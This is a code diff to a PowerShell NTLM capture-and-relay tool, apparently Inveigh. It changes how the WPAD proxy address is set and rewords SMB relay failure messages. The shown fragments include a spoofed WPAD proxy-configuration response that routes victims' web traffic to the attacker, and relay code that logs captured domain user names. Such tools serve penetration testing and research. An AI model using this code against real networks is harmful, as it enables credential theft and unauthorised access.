@@ -90,7 +90,7 @@ target.
 Default = Enable: (Y/N) Enable/Disable automaticaly exiting after a relay is disabled due to success or error.
 
 .PARAMETER ConsoleOutput
-Default = Disabled: (N,Y,Medium,Low) Enable/Disable real time console output. If using this option through a shell, test to
+Default = Disabled: (Low,Medium,Y,N) Enable/Disable real time console output. If using this option through a shell, test to
 ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
 
 .PARAMETER ConsoleStatus
@@ -164,7 +164,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$Usernames = "",
@@ -188,9 +188,9 @@ if ($invalid_parameter)
     throw
 }
 
-if(!$ProxyIP)
+if($ProxyIP -eq '0.0.0.0')
 { 
-    $ProxyIP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
+    $proxy_WPAD_IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
 }
 
 if(!$OutputDir)
@@ -492,7 +492,7 @@ if($Proxy -eq 'Y')
 {
     $inveigh.status_queue.Add("Proxy Capture/Relay = Enabled")  > $null
     $ProxyPortFailover = $ProxyPort + 1
-    $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $ProxyIP`:$ProxyPort; PROXY $ProxyIP`:$ProxyPortFailover; DIRECT`";}"
+    $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
     $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})
 
     if($ProxyIgnore.Count -gt 0)
@@ -1813,8 +1813,8 @@ $SMB_relay_response_scriptblock =
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                             {
-                                $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $Target")])
+                                $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")])
                                 $SMB_relay_failed = $true
                             }
                             else
@@ -2249,8 +2249,8 @@ $SMB_relay_response_scriptblock =
                             }
                             elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                             {
-                                $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $Target")])
+                                $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")])
                                 $SMB_relay_failed = $true
                             }
                             else
